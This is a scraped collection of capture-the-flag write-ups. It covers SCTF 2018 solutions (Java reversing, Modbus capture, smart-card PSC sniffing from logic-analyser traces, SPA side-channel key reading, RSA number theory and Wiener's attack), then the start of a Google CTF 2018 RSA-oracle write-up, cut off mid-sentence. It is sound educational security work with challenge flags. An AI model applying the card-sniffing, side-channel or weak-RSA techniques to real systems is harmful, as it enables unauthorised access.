4);`\n   - `Square((flag[ 1] << 8) + 0x315F00FF,  4);`\n   - `Square((flag[ 2] << 8) + 0x315F00FF,  4);`\n   - `Square((flag[ 3] << 8) + 0x315F00FF,  4);`\n   - `Square((flag[ 4] << 8) + 0x315F00FF,  4);`\n   - `Square((flag[ 5] << 8) + 0x315F00FF,  4);`\n   - `Square((flag[ 6] << 8) + 0x315F00FF,  4);`\n   - `Square((flag[ 7] << 8) + 0x315F00FF,  4);`\n   - `Square((flag[ 8] << 8) + 0x315F00FF,  8);`\n   - `Square((flag[ 9] << 8) + 0x315F00FF,  8);`\n   - `Square((flag[10] << 8) + 0x315F00FF,  8);`\n   - `Square((flag[11] << 8) + 0x315F00FF,  8);`\n   - `Square((flag[12] << 8) + 0x315F00FF,  8);`\n   - `Square((flag[13] << 8) + 0x315F00FF,  8);`\n   - `Square((flag[14] << 8) + 0x315F00FF,  8);`\n   - `Square((flag[15] << 8) + 0x315F00FF,  8);`\n   - `Square((flag[16] << 8) + 0x315F00FF, 12);`\n   - `Square((flag[17] << 8) + 0x315F00FF, 12);`\n   - `Square((flag[18] << 8) + 0x315F00FF, 12);`\n   - `Square((flag[19] << 8) + 0x315F00FF, 12);`\n   - `Square((flag[20] << 8) + 0x315F00FF, 12);`\n   - `Square((flag[21] << 8) + 0x315F00FF, 12);`\n   - `Square((flag[22] << 8) + 0x315F00FF, 12);`\n   - `Square((flag[23] << 8) + 0x315F00FF, 12);`\n\nWith this summary, we can forget about `MainActivity` and focus on `Square`.\n\n    Square(int paramInt1, int paramInt2) {\n      input = paramInt1;\n      turncout = paramInt2;\n      initpoint();\n      if (check()) {\n        turnpoint();\n      }\n    }\n\n`Square` remembers the two parameters we give it as `input` and `turncout` (typo for `turncount` maybe?). It calls `initpoint` to initialise its array of 25 `Point` instances. It internally calls `check` and does `turnpoint` if it passes after already.\n\n    private void initpoint() {\n      for (int i = 0; i < 5; i++) {\n        for (int j = 0; j < 5; j++) {\n          point[i * 5 + j] = new Point(j, i, (input & (1 << (i * 5 + j))) >> i * 5 + j);\n        }\n      }\n    }\n\nThe actual array is initialised as a 5 by 5 grid of points, each of which is on or off based on one bit from the input.\n\n    Input: (flagCharacter << 8) + 0x315F00FF\n    As bits:\n    0011 0001 0101 1111 ABCD EFGH 1111 1111\n                        ^ A-H are bits from the flag character\n\nThen the initial layout for the `Point` array is (left-most column is Y coordinate, topmost is X coordinate, the rest are bit values):\n\n| | 0 | 1 | 2 | 3 | 4 |\n| --- | --- | --- | --- | --- | --- |\n| 0 | 1 | 1 | 1 | 1 | 1 |\n| 1 | 1 | 1 | 1 | H | G |\n| 2 | F | E | D | C | B |\n| 3 | A | 1 | 1 | 1 | 1 |\n| 4 | 1 | 0 | 1 | 0 | 1 |\n\n(The square choice of X and Y axes for the coordinates actually doesn't matter; as you will see, the `check` function is symmetric.)\n\nThe left-most bits of the `0x315F00FF` value are not actually used, so they are red herrings, perhaps. Now let's look at the `check` function:\n\n    public boolean check() {\n      int i = 0;\n      for (int k = 0; k < 5; k++) {\n        Point localPoint = findPoint(k, k);\n        int j = i;\n        if (localPoint != null) {\n          j = i + localPoint.getValue();\n        }\n        localPoint = findPoint(4 - k, k);\n        i = j;\n        if (localPoint != null) {\n          i = j + localPoint.getValue();\n        }\n      }\n      return i >= 10;\n    }\n\n`findPoint` simply returns a `Point` with the given coordinates, and `getValue` of a `Point` returns 1 when the `Point` is \"on\". So since we have a 5 by 5 grid, this function is checking whether all (10) `Point`s lying on the two diagonals of the `Square` are \"on\". With the initial setting of the `Square` this will happen if the `D` and `H` bits of our flag character are 1.\n\nAnd finally, the `turnpoint` function:\n\n    private void turnpoint() {\n      for (int i = 0; i < turncout; i++) {\n        Point localPoint = point[0];\n        for (int j = 0; j < 24; j++) {\n          point[j] = point[(j + 1)];\n          point[j].movepos();\n        }\n        point[24] = localPoint;\n        point[24].movepos();\n      }\n    }\n\nThis simply performs a circular rotation of the `Point`s array, `turncout` times. The `movepos` function updates the coordinates accordingly. This is not a 2D rotation, but a rotation of the 1D array, like so:\n\n     1  2  3  4  5       2  3  4  5  6\n     6  7  8  9 10       7  8  9 10 11\n    11 12 13 14 15  ->  12 13 14 15 16\n    16 17 18 19 20      17 18 19 20 21\n    21 22 23 24 25      22 23 24 25  1\n\nAll of the above is just a very terrible implementation of a relatively simple cipher / hash, with loads of unnecessary Java OOP.\n\nBut, we now know one important thing: even though there is a certain connection between consecutive flag characters in the same 8-character block (strictly increasing sequence), they have no other effect on the hash process; the `Square` `check` only takes one byte of data as its input. So with 63 possible values (in the interval `[49, 111]`) we can easily check all of them, do this for all three flag blocks and hope that the sequences are unique.\n\n([full solver script](scripts/simple/SquareSolve.hx))\n\n    $ haxe --run SquareSolve\n    57=?UW]_\n    QSUWY[]_\n    9;=?Y[]_\n\nSo luckily the three sequences are indeed unique and each flag block has only 8 solutions. I was a bit worried that this doesn't look very much like a flag, but nope, it was correct.\n\n`SCTF{57=?UW]_QSUWY[]_9;=?Y[]_}`\n\n## 46 Misc / Welcome to SCTF 2018 ##\n\n**Description**\n\n> sctf{syc_always_with_you}\n\n**No files provided**\n\n**Solution**\n\nThe only notable thing about this challenge is that it led me to believe that the flag format is `sctf{...}`, with lowercase `sctf`. Most of the flags were `SCTF{...}`!\n\n`sctf{syc_always_with_you}`\n\n## 129 Misc / 神奇的Modbus ##\n\n(Magical Modbus)\n\n**Description**\n\n> 寻找flag\n\n**Translated description**\n\n> Find flag\n\n**Files provided**\n\n - [`a ZIP containing a packet capture`](files/modbus1.zip)\n\n**Solution**\n\nOpening up the packet capture, we can see a lot of various traffic. Some of it is encrypted. But, the challenge is called modbus, and there are a couple of modbus packets around. In Wireshark we can simply filter `modbus` to show only these packets. With that we get 4064 packets of Modbus going back and forth between two hosts. We can follow the TCP stream and show either's side data only. There are many repeats of the flag in this stream, e.g.:\n\n![](screens/modbus1.png)\n\n`sctf{Easy_Mdbus}`\n\n## 434 Misc / 神秘的交易 ##\n\n(Mysterious Transactions)\n\n**Description**\n\n> 惊了！怪不得柠檬师傅最近总往北街跑。看他午休的时候，我悄悄拿走了他的会员卡，是一张4442的接触式卡。你知道吗，通过逻辑分析仪可以嗅探出他的加密密钥。快来跟我念出密钥，把他揪出来！（以16进制表示\n> \n> (and a picture showing people agreeing on a date, irrelevant to the challenge)\n> \n> (hint) SCTF｛flag｝flag若存在字母，用大写，16进制不带0x\n\n**Translated description**\n\n> Shocked! No wonder that Master Lemon has always been running North Street. Looking at his lunch break, I quietly took away his membership card, which is a 4442 contact card. Did you know that the logic analyzer can sniff out his encryption key? Come and read the key to me and get him out! (in hexadecimal)\n> \n> (hint) SCTF{flag} If there is a letter, use upper case, hexadecimal without 0x\n\n**Files provided**\n\n - [a .logicdata file](files/transactions1.logicdata)\n\n**Solution**\n\nLooking online for what a .logicdata file is, we can find [Saleae Logic](https://www.saleae.com/downloads/), software for using their Logic analyser hardware. The \"demo\" indeed works for opening the file and looking at its contents.\n\n![](screens/transactions1.png)\n\nThis works fine, and the program does offer some automated protocol analysers, but not the kind that we need. Fortunately we can export the data into a [CSV file](scripts/transactions1/data.csv), which is more easily parsable with custom scripts. 6 of the 8 channels present in the file are empty. The remaining two are called `clk` (clock) and `data`. Since there is a clock signal present, we don't care about the exact timing of signals (e.g. length of pulses). Both of the two channels are digital, carrying only high or low signals. So when exporting we can just output a file containing the samples at which a channel changes. (Exporting a CSV with all the samples in the file results in a huge file that is annoying to work with.)\n\n    $ head export.csv\n    Sample, clk, data\n    -10000000, 0, 1\n    -100, 1, 1\n    -50, 1, 0\n    0, 0, 0\n    29, 0, 1\n    76, 1, 1\n    129, 0, 1\n    147, 0, 0\n    194, 1, 0\n\nWe can probably safely ignore the data in the negative sample counts.\n\nLet's try to find out what protocol this is. Even though the English translation of the challenge description is far from perfect, it does clearly say `4442`. After some googling, we can find the [official datasheet for SLE 4442 integrated chips](files/sle4442.pdf), probably a very useful resource.\n\nThe chip has 256 bytes of memory, some of which can irreversibly be marked read-only. SLE 4442 (as opposed to the SLE 4432) also has a PSC, programmable security code, which is also what we are looking for in this challenge.\n\nMost of the decoding just consists of reading the current value of the `data` channel whenever `clk` rises. The datasheet makes most parsing quite clear. The only thing that was slightly annoying / surprising was that the bits of a byte are transmitted LSB first.\n\nNote: digital signals rise (going from a 0 to a 1) and fall (going from a 1 to a 0). If the data recorded were analogue, there'd be some logic / thresholds to determine if a line is currently high or low, and to check what it was on the last sample. Fortunately, in this challenge we are provided with the digital values already.\n\nThe decoder (and the protocol) has three modes:\n\n - `command` - triggered by `data` rising and `clk` falling; in this mode the host device (i.e. not the card) sends a 3-byte command to the card; end marked with `data` rising and `clk` rising\n - `outgoing` - some commands request data from the card; in this mode a bit is available on the `data` line every time `clk` rises; the amount of data is known in advance based on the command issued\n - `processing` - other commands tell the card to do some internal processing; this processing takes a number of clock cycles (determined by `clk` pulses); once `data` rises, the processing is done\n\nThe `clk` signal is always generated by the host, `data` can be pulled low or high by either device as needed.\n\nThere are only seven commands implemented in SLE 4442:\n\n - `READ MAIN MEMORY`\n - `UPDATE MAIN MEMORY`\n - `READ PROTECTION MEMORY`\n - `WRITE PROTECTION MEMORY`\n - `READ SECURITY MEMORY`\n - `UPDATE SECURITY MEMORY`\n - `COMPARE VERIFICATION DATA`\n\nOnce again, in this challenge our goal is to find out the PSC, the \"password\" used to access and modify data on the card. In the spec we can find a section called \"PSC Verification\". To input the PSC into the card, the following commands have to be issued, in this order:\n\n - `READ SECURITY MEMORY`\n - `UPDATE SECURITY MEMORY`\n - `COMPARE VERIFICATION DATA` - byte 1 of PSC\n - `COMPARE VERIFICATION DATA` - byte 2 of PSC\n - `COMPARE VERIFICATION DATA` - byte 3 of PSC\n - `UPDATE SECURITY MEMORY`\n - `READ SECURITY MEMORY`\n\nThe other commands also need to provide specific data, but as long as we find this sequence in the data we have, we should be able to find the PSC.\n\n([full decode script](scripts/transactions1/Decode.hx))\n\n`SCTF{403110}`\n\n## 285 Misc / 肥宅快乐题 ##\n\n(Fat house happy questions (???))\n\n**Description**\n\n> 真正的快乐的游戏题，打通就给flag哦，与肥宅快乐水搭配更佳。\n> \n> Flash游戏，通关后，注意与NPC的对话哦;)\n> \n> 点击Continue开始游戏，New game按钮有些电脑会有bug\n> \n> flag的格式为SYC{}\n\n**Translated description**\n\n> Really happy game title, open to give the flag oh, and happy house with happy water better.\n> \n> Flash game, after clearance, pay attention to the dialogue with the NPC;)\n> \n> Click Continue to start the game. Some new computers have bugs on the computer.\n> \n> The format of flag is SYC{}\n\n**Files provided**\n\n - [a ZIP file with happy.swf](files/happy.zip)\n\n**Solution**\n\nThe SWF file we are given is just a (lightly modified) game called Thing Thing 4. A classic from back when Flash was good and Flash games had their golden era. The description said to clear the game, then pay attention to the dialogue.\n\nI got to this challenge close to the end of the CTF and was very tired, almost falling asleep while looking at the screen and playing the game. I did not have the mental capacity to think of clever ways to break the game so that I don't have to play it.\n\nBut if you just play the game and win, you get the flag, so that's what I did.\n\nThere are some \"cheesy\" tactics you can do while playing the game, such as standing near the enemy spawn points with a melee weapon and waiting until you have enough kills to enter the next area. The enemies never attack when you are too close to them.\n\nThe finall boss has two forms, one extremely weak where he tries to punch you, and then (after taking a couple of hits), the real spider form. During the battle enemies spawn on the left side of the level, enabling the player to collect their guns and ammo. Once again I just stood by their spawn point and gather a lot of ammo for the \"Jackhammer\" shotgun. When fired from point-blank range this weapon seems to have one of the highest DPS in the game. With ~150 rounds for the shotgun, I focused the boss and in three or four salvos he was gone.\n\n![](screens/happy.png)\n\n    $ base64 -D <<< U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9\n    SYC{F3iZhai_ku4ile_T111}\n\nI did actually investigate (a little bit) how the game remembers your progress. If you close the game, you can continue where you stopped. In Flash this is accomplished using `flash.net.SharedObject`. Each shared object has a name, which uniquely identifies it. The SO name for this game was `meatyData` and contained entries like `levelOn`, `ammo`, `kills`, etc.\n\nThe first entry in the `ammo` array seems to be a checksum of the rest of the array. The SO has both `levelOn` and `levelOn2`, presumably a protection scheme for the level number as well. It was a pain to collect any data for these keys, since each restart of the game meant having to sit through the producer and developer intros. Additionally, any time the checksums were incorrect, the game would delete the shared object.\n\nUsing a Flash decompiler with the game produced a lot of garbage code, presumably an Anti-RE technique added by the CTF organisers.\n\nI know this solution seems a bit lazy and it would have been more interesting to learn about proper Flash decompilation and reversing the checksum scheme. But, with the time running quie low, I was happy to have the flag.\n\n`SYC{F3iZhai_ku4ile_T111}`\n\n## 357 Misc / 侧信道初探 ##\n\n(On the side channel)\n\n**Description**\n\n> 施主，我看你有学侧信道的慧根！来道简单的能量分析攻击（SPA）帮助你理解一下吧~\n> \n> 程序在运行的时候，不同复杂度所用的时间和消耗的能量是不同的，附件中的图是运行这个段代码是运行椭圆曲线按位扫描二进制点乘算法时，采集的部分能量数据。请以二进制形式读出来。\n> \n> （本题感谢CUIT 6011硬件安全实验室提供数据）\n\n**Translated description**\n\n> The donor, I think you have learned the side channel of Huigen! A simple energy analysis attack (SPA) to help you understand it\n> \n> When the program is running, the time and energy consumed by different complexity are different. The figure in the appendix is the part of the energy data collected when running this segment code to run the elliptic curve bitwise scanning binary point multiplication algorithm. Please read it out in binary format.\n> \n> (This question is thanks to the CUIT 6011 Hardware Security Lab for data)\n\n**Files given**\n\n - a ZIP file containing two images:\n\n`algorithm.png`\n\n![](files/side-algorithm.png)\n\n`misc-challenges-1-1.png`\n\n![](files/side-data.png)\n\n**Solution**\n\nThe description pretty much describes the solution. In a SPA attack, the power usage graph of the target device is inspected and, assuming the device is using an algorithm that was not designed to resist this type of attack, individual bits of the key used can be read directly.\n\nIn this case the algorithm is clearly performing different operations based on individual bits of the key. The `R <- [2]R` step is performed for each bit, but `R <- R + P` is performed only for \"1\" bits.\n\nIn the graph we can identify patterns simply by their shape. There are three different wave patterns. Let's call these A, B, and C.\n\n![](screens/side-waves.png)\n\nAs you can see, A and B seem similar, but their shape differs on the bottom.\n\nWith that, we can read the graph as this sequence:\n\n    A, B, C, B, C, A, B, C, B, C, B, C, A, B, C, A\n\nDuring the CTF I was first thinking of the graph as being separated by \"C\" patterns, and the presence of \"A\" or \"AB\" between them carrying information about individual bits. This was wrong, and in fact, if \"A\" represented a \"0\" bit, and \"AB\" represented a \"1\" bit, there is nothing in the algorithm that could produce the \"C\" pattern, since the only other operation in the algorithm is the loop counter increasing and a jump. These are unlikely to be very power intensive operations.\n\nInstead, note that \"C\" always follows \"B\", so let's treat them as a single unit.\n\n    A\n      BC\n      BC\n    A\n      BC\n      BC\n      BC\n    A\n      BC\n    A\n\nThen we can read \"A\" as a \"0\" bit, and \"BC\" as a \"1\" bit, giving us the actual key used: 0110111010.\n\nAlso the key does not have consecutive \"0\" bits, which is why my initial attempt was wrong.\n\n`SCTF{0110111010}`\n\n## 909 Misc / 交易识破后的报复 ##\n\n(Revenge after seeing the transaction)\n\n**Description**\n\n> 上次被抓了现行之后，柠檬师傅恼羞成怒，偷偷拿走我自制的模拟电子钱包——一张4428协议的接触式卡，不仅改了我的密码。还修改了我的金额！！！更嚣张的是，还把他改的过程发给我了！哼！搞笑？就好像谁看不出来你怎么改的似的？我不仅分分钟念出你改的密码，我还能说出的改了哪里，内容改成了什么！\n> \n> （注意flag提交形式：包含1.密码2.所修改的内容的地址3.修改后的数据。flag形式全部以16进制提交，例：sctf{密码+目的地址+数据}。地址，数据都是直接连着写，中间不用空格什么的分开，但是密码，地址，数据三部分之间用加号连接。顺序不能变，16进制字母全用大写。emmmmm，格式真的在解释一下，像这样：sctf{0123ABC……+0123ABC……+0123ABC…… }  数据瞎输的，关键是解释一下格式，不是故意在格式上设坑的。）\n\n**Translated description**\n\n> After being caught the last time, the Lemon Master was furious and secretly took away my self-made analog electronic purse, a 4428 agreement contact card, which not only changed my password. Also modified my amount! ! ! What's more arrogant is that he also sent me the process of changing him! Humph! Funny? Just like who can't see how you changed? I not only read the password you changed in minutes, but I can also tell you where the content changed!\n> \n> (Note that the form of flag submission includes: 1. the password 2. the address of the modified content 3. the modified data. The flag format is all submitted in hexadecimal, for example: sctf {password + destination address + data}. Is directly connected to the write, the middle without a separate space or something, but the password, address, data between the three parts connected with a plus sign. Order can not be changed, all letters in hexadecimal letters. Emmmmm, the format really explain, like In this way: sctf {0123ABC... +0123ABC... +0123ABC... } The key to data loss is to explain the format, not intentionally pitting the format.)\n\n**Files given**\n\n - [a .logicdata file](files/transactions2.logicdata)\n\n**Solution**\n\nAnother logic analyser capture. This time, the card used was a 4428. Once again, the [official datasheet for SLE 4428 integrated chips](files/sle4428.pdf) was crucial to solving this. The description of the flag is extremely confusing, but more on this later.\n\nWe repeat the same steps as last time, extracting [an easily-parsable CSV](scripts/transactions2/data.csv) from the logicdata file.\n\nThis time, we have three digital signals - `clk`, `data`, and `reset`. A \"1\" on the `reset` line indicates the host device is sending data to the card, otherwise data may be coming from the card to the host, or processing is being done.\n\nFor this challenge we need to know not only the PSC, but also the data that was written to the card, so our parsing should be more complete. The commands available on the SLE 4428 are:\n\n - write and erase with protect\n - write and erase without protect\n - write protect with data comparison\n - read data with protect\n - read data without protect\n - write error counter\n - verify PSC byte\n\nOnce again, the commands are sent in 3-byte packets. To make space for the 1024 bytes of byte-addressable memory, the command ID is six bits, the address is 10 bits, and data is 8 bits. One thing that was unclear to me based on the spec was the bit ordering. Just like with the SLE 4442, values are generally transmitted LSB first, but this was not written anywhere in the SLE 4428 spec.\n\nThe PSC verification consists of:\n\n > – write one not written error-counter bit, address \"1021\",\n > – enter first PSC-code byte, address \"1022\",\n > – enter second PSC-code byte, address \"1023\",\n > – after correct input the error counter can be erased.\n\nOn the SLE 4428 there is a concept of memory protection, where a separate address space specifies which bytes of the memory are writable. Once a byte on the main memory is marked as read-only, this protection cannot be reversed.\n\nI wasted a long time on this particular feature. I actually had the correct solution, but no matter how I wrote it, my flag was not accepted. So naturally I was wondering if perhaps I misunderstood the protection bits. In the process of debugging my script was outputting that in fact all the protection bits are set to \"1\".\n\nMy assumption was that the protection bit being \"1\" means the corresponding byte in memory is protected. So if all the protection memory is \"1\"-filled, writing would be impossible. I thought perhaps for some reason the `data` line carries inverted data, so `data` low would represent a \"1\" and vice versa. But this introduced problems of its own, such as the addresses not really making sense anymore.\n\nAs it turns out, my assumption was wrong. I didn't pay enough attention to this part of the spec:\n\n > Remark: Erase means \"0\" -> \"1\", write means \"1\" -> \"0\".\n\nI thought this was only relevant to understand the terminology used in that particular section, which was explaining that it may take the card different amounts of time to write particular data to the memory depending on what was there beforehand.\n\nBut the remark also applied to the protection bits, so\n\n > The protect bit is erased at delivery, it can be written only once. \n\nmeans the protection bit can only be set to \"0\" once.\n\nSo in fact all of the memory on the card was unprotected and hence all of the protection bits were \"1\".\n\nAgain and again after checking all of my script I got the following data:\n\n - PSC is `0x0501`\n - data is written at address `0x80`\n - the full 16 bytes written are `0xFFF60572FFFFFFFFFFFFFFFFFFFFFFFF`\n\nBut no matter how I put it, I did not get the flag. The data at address `0x80` was filled with `0xFF` bytes, so maybe the flag only consisted of the modified data?\n\nBack to the challenge description - perhaps it is partly that the machine translation is far from accurate, but it seems to me that the authors wrote an entire paragraph about the flag format with \"emm\" (why not organise your thoughts beforehand...) but forgot to mention that despite the writing being consecutive, the flag has to contain all 16 addresses. A lot of time wasted …\n\n([full decoder script](scripts/transactions2/Decode.hx))\n\n`sctf{0512+808182838485868788898A8B8C8D8E8F+FFF60572FFFFFFFFFFFFFFFFFFFFFFFF}`\n\n## 465 Crypto / a number problem ##\n\n**Description**\n\n> You should learn number theory\n\n**Files given**\n\n - the challenge:\n\n    x**33=1926041757553905692219721422025224638913707 mod 3436415358139016629092568198745009225773259\n    tell me the smallest answer of x\n\n**Solution**\n\nThis challenge looks very much like RSA, but even though it is possible to factorise `n == 3881 * 885445853681787330351086884500131209939` (e.g. using WolframAlpha or yafu), we are not done - the exponent `e` has no modular multiplicative inverse mod `n`.\n\nHowever, `e` is composite (3 * 11), and by exponentiation rules, we know that `x ** 33 == (x ** 3) ** 11`. 11 does have a modular multiplicative inverse:\n\n    $ python3\n    >>> from rsa import *\n    >>> p = 3881\n    >>> q = 885445853681787330351086884500131209939\n    >>> n = p * q\n    >>> e = 33\n    >>> cipher = 1926041757553905692219721422025224638913707\n    >>> phi = lcm(p - 1, q - 1)\n    >>> multiplicative_inverse(33, phi)\n    (none)\n    >>> multiplicative_inverse(3, phi)\n    (none)\n    >>> d = multiplicative_inverse(11, phi)\n    >>> d\n    2030085857259516042859491929735755374057851\n    >>> pow(cipher, d, n)\n    297068717261984532037457456841187165228424\n\nSo we have simplified our problem to:\n\n    x ** 3 = 297068717261984532037457456841187165228424 mod n\n\nUnfortunately, this number is still not a cube. However, if `y == A mod n`, then solutions for `y` are of the form `A + b * n`, for some integer `b`. We can relatively quickly check for solutions to the above equation by substituting `y = x ** 3` and looking through all `b` until we find one such that `y` is a cube.\n\n([full solver script](scripts/numberproblem.py))\n\nFortunately the guess was correct and we find a solution, with `b = 243277`, a relatively quick find. There might be a more clever way to do this last step, but for now this challenge it is unnecessary.\n\n`SCTF{9420391510958023}`\n\n## 144 Crypto / it may contain 'flag' ##\n\n**Description**\n\n> try it!\n\n**Files provided**\n\n - the challenge:\n\n    n=0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bf\n    e=0xe42a12145eaa816e2846200608080305c99468042450925789504307cbc54a20ed7071b68b067b703a1679d861795542f8cbd2d1cb4d3847d0940cac018cdb0fa729571afbe10c1b8be2dd8acd99ee48b77d53c435b9c2fed59e12e02ad8cfc2bcc46ad85534c266dcc1f3a1a03d87118eaf3f5b3eeeb3be84ad023a4bf34939\n    c=0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3\n    Tell me the msg.\n\n**Solution**\n\nAnother one that looks very much like RSA. This time it **is** RSA, the choice of variable names confirms it. But you might notice something strange - the public exponent is almost as large as the modulus. Common values for `e` include 3 and 65537. It is unusual to see very large public exponents.\n\nAfter some brief searching through the Wikipedia page on RSA, we can find a mention of [\"Weiner's attack\"](https://en.wikipedia.org/wiki/Wiener%27s_attack) in the [section on faulty key generation](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Faulty_key_generation).\n\nThe attack targets a small `d` (private exponent). A very large public modulus may be a sign that this is the case.\n\nWith some more searching, we can find [Sagi Kedmi's description of Wiener's attack](https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/), which includes a full Python implementation of the process. I cannot hope to explain the attack better than he did, nor provide a more practical implementation of the attack.\n\nIn the script we simply replace the weak key generation with the parameters we are given in the challenge and let it run. And very quickly, we get the result: `d = 731297`.\n\n    $ python3\n    >>> n = 0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bf\n    >>> c = 0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3\n    >>> d = 731297\n    >>> pow(c, d, n).to_bytes(22, \"big\")\n    b'flag1sH3r3_d_ist0sma1l'\n\n`SCTF{H3r3_d_ist0sma1l}`\n", "timestamp": "2025-10-24T11:38:58.397964"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-06-23-Google-CTF-Quals/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-06-23-Google-CTF-Quals/README.md", "content": "# 2018-06-23-Google-CTF-Quals #\n\n[CTFTime link](https://ctftime.org/event/623) | [Website](https://capturetheflag.withgoogle.com/)\n\n---\n\n## Challenges ##\n\n### Crypto ###\n\n - [ ] 231 Better ZIP\n - [ ] 176 DM Collision\n - [ ] 267 Dogestore\n - [ ] 243 MITM\n - [x] [158 Perfect Secrecy](#158-crypto--perfect-secrecy)\n\n### Misc ###\n\n - [ ] 363 Bookshelf\n - [x] [208 Feel It](#208-misc--feel-it)\n - [ ] 420 Phrack\n - [ ] 355 Tape\n - [x] [220 Wired CSV](#220-misc--wired-csv)\n\n### Pwn ###\n\n - [ ] 500 Drive\n - [ ] 283 Execve Sandbox\n - [ ] 420 APT42 - Part 2\n - [ ] 420 Sandbox Compat\n - [ ] 181 SFTP\n\n### RE ###\n\n - [x] [113 Shall we play a game?](#113-re--shall-we-play-a-game)\n - [x] [293 Back to the Basics](#293-re--back-to-the-basics)\n - [ ] 249 Keygenme\n - [ ] 288 APT42 - Part 1\n - [ ] 326 Proprietary Format\n\n### Web ###\n\n - [ ] 453 BBS\n - [ ] 210 Cat Chat\n - [ ] 326 gCalc\n - [x] [121 JS Safe 2.0](#121-web--js-safe-20)\n - [ ] 246 Translate\n\n---\n\n## 158 Crypto / Perfect Secrecy ##\n\n**Description**\n\n> This crypto experiment will help you decrypt an RSA encrypted message.\n> \n> `nc perfect-secrecy.ctfcompetition.com 1337`\n\n**Files provided**\n\n - [a ZIP file](files/perfect-secrecy.zip) containing:\n   - `challenge.py` - script running on the server\n   - `flag.txt` - 1024-bit encrypted message\n   - `key_pub.pem` - 1024-bit RSA public key\n\n**Solution**\n\nFirst we can extract data from the public key file `key_pub.pem` using OpenSSL command-line tools:\n\n    $ openssl rsa -pubin -in key_pub.pem -text -noout\n    Public-Key: (1024 bit)\n    Modulus:\n        00:da:53:a8:99:d5:57:30:91:af:6c:c9:c9:a9:fc:\n        31:5f:76:40:2c:89:70:bb:b1:98:6b:fe:8e:29:ce:\n        d1:2d:0a:df:61:b2:1d:6c:28:1c:cb:f2:ef:ed:79:\n        aa:7d:d2:3a:27:76:b0:35:03:b1:af:35:4e:35:bf:\n        58:c9:1d:b7:d7:c6:2f:6b:92:c9:18:c9:0b:68:85:\n        9c:77:ca:e9:fd:b3:14:f8:24:90:a0:d6:b5:0c:5d:\n        c8:5f:5c:92:a6:fd:f1:97:16:ac:84:51:ef:e8:bb:\n        df:48:8a:e0:98:a7:c7:6a:dd:25:99:f2:ca:64:20:\n        73:af:a2:0d:14:3a:f4:03:d1\n    Exponent: 65537 (0x10001)\n\nAnd we can confirm `flag.txt` is indeed encrypted:\n\n    $ xxd flag.txt\n    0000000: a9c5 65cb c2cf 1c7d 4267 fd17 69dc e9f0  ..e....}Bg..i...\n    0000010: 3481 800b bae8 6bb0 926a e617 a7e6 d09f  4.....k..j......\n    0000020: 2c61 a9d7 0a85 6783 973c 4c55 bf43 a24c  ,a....g..<LU.C.L\n    0000030: 1d70 f7b0 2ac0 34ff 39c5 37ab 39c7 8d90  .p..*.4.9.7.9...\n    0000040: 523a 8107 a098 0195 df35 21d6 54d7 2069  R:.......5!.T. i\n    0000050: f942 8208 431c c763 def3 9bcd 8cd3 ea9d  .B..C..c........\n    0000060: 45e9 9e23 f781 0fa0 3b6c e906 d6f4 1373  E..#....;l.....s\n    0000070: e0e2 a7c0 2230 1828 d7f8 0ed3 c630 ae56  ....\"0.(.....0.V\n\nAfter studying the Python script provided for a little bit, we can decide to ignore most of it - the parts that take care of setting up the service and doing standard RSA operations are not important.\n\nThis is the actual core of the challenge, with some comments:\n\n    def Challenge(private_key, reader, writer):\n      try:\n        # read two bytes from the client\n        m0 = reader.read(1)\n        m1 = reader.read(1)\n        # read a ciphertext from the client\n        ciphertext = reader.read(private_key.public_key().key_size // 8)\n        # decrypt it\n        dice = RsaDecrypt(private_key, ciphertext)\n        # repeat a 100 times ...\n        for rounds in range(100):\n          # select one of the two bytes given based on the\n          #  least significant bit of the decrypted ciphertext\n          p = [m0, m1][dice & 1]\n          # choose a random number (0, 1, or 2!)\n          k = random.randint(0, 2)\n          # add the random number to the byte selected,\n          #  then keep its least significant bit only\n          c = (ord(p) + k) % 2\n          # zero-expand this single bit to a byte and send it to the client\n          writer.write(bytes((c,)))\n        writer.flush()\n        return 0\n      except Exception as e:\n        return 1\n\nIn a challenge like this, it is very important to understand where we actually gain any useful information. We cannot break a 1024-bit RSA key (practically), so neither the encoded message nor the public key help us. We are given a remote service so naturally we need to interact with it one way or another to solve the challenge.\n\nIn the above script, we can provide the server with any ciphertext and it will decrypt it for us. However, `dice`, the variable containing the decrypted data, is not used anywhere except as `dice & 1`, giving us only a single bit of information. We need to consider how this could be useful.\n\nApart from that, `random.randint(0, 2)` might be a source of trip ups. I was not sure whether or not the upper bound was exclusive. If it were, then this function call would return `0` roughly 50% of the time and `1` otherwise. If this were the case, the attack we will choose in the end would not have been possible, and we might have considered other side channels - timing? Padding oracle? And so on.\n\nBut, `random.randint(0, 2)` indeed returns `0`, `1`, or `2`, all with equal probabilities. This is significant because `0` and `2` are both even numbers, whereas `1` is not. This random distribution is biased towards even numbers, returning an odd number only 33% of the time!\n\nLet's summarise the procedure of a single interaction with the server:\n\n - connect\n - provide 